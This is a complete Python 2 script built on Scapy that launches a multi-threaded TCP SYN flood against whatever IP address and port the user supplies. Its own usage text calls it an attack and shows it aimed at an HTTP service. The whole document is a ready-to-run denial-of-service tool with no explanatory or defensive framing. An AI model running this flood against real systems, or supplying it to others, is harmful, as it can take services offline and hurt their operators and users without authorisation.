#!/usr/bin/python

from scapy.all import *
from time import sleep
import thread
import random
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

if len(sys.argv) != 4:
	print 'Usage - {} [Target-IP] [Port Number] [Threads]'.format(sys.argv[0])
	print 'Example - {} 10.0.0.5 80 20'.format(sys.argv[0])
	print 'Example will perform a 20x multi-threaded SYN flood attack against the HTTP (port 80) service on 10.0.0.5'
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

print 'Performing SYN flood. Use CTRL-C to stop attack.'

def synflood(target, port):
	while True:
		x = random.randint(0, 65535)
		send(IP(dst=target)/TCP(dport=port, sport=x), verbose=0)

for x in range(0, threads):
	thread.start_new_thread(synflood, (target, port))

while True:
	sleep(1)
